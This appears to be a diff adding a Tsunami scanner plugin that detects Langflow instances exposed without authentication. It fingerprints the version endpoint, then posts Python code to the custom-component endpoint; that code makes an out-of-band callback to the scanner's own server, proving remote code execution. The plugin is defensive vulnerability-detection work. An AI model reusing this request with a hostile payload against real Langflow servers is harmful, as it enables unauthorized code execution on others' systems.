@@ -1,0 +1,106 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Langflow_ExposedUI"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version,"
+    " Giacomo Coluccelli (giacomo@doyensec.com) for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "LANGFLOW_EXPOSEDUI"
+  }
+  severity: CRITICAL
+  title: "Langflow Exposed UI"
+  description: 
+    "The scanner detected a Langflow instance without proper authentication. Langflow allows"
+    " users to customize components by writing Python code. Exposing it without proper"
+    " authentication introduces a risk of remote code execution (RCE). \n"
+  recommendation: 
+    "Disable the auto-login feature setting the ENABLE_AUTO_LOGIN environment variable to False."
+    " Instructions are available in the official documentation:"
+    " https://docs.langflow.org/configuration-authentication#langflow_auto_login. \n"
+    "Note that Langflow authentication has changed over time and become more secure, so you should "
+    "also ensure that Langflow is updated. "
+}
+
+config: { debug: true }
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_langflow"
+  http_request: {
+    method: GET
+    uri: "/api/v1/version"
+    response: {
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"package\":\"Langflow\"" }
+        ]
+      }
+    }
+  }
+}
+
+# OOB version. The original plugin also had reflective, but response is not returned unless OOB.
+# Removed reflective version to prevent false positives.
+# Also changed payload to use requests.get(...) instead of subprocess RCE.
+
+actions: {
+  name: "execute_payload_oob"
+  http_request: {
+    method: POST
+    uri: "/api/v1/custom_component"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/json"}
+    ]
+    data: 
+      "{\"code\":\"import requests\\n"
+      "from langflow.custom import Component\\n"
+      "class TsunamiComponent(Component):\\n"
+      "    def __init__(self, *args, **kwargs):\\n"
+      "        super().__init__(*args, **kwargs)\\n"
+      "        requests.get(\\\"{{ T_CBS_URI }}\\\")\\n"
+      "\\n"
+      "\"}"
+  }
+}
+
+# since we already fingerprinted we can do a long sleep here.
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 5000 } }
+}
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_langflow",
+    "execute_payload_oob",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
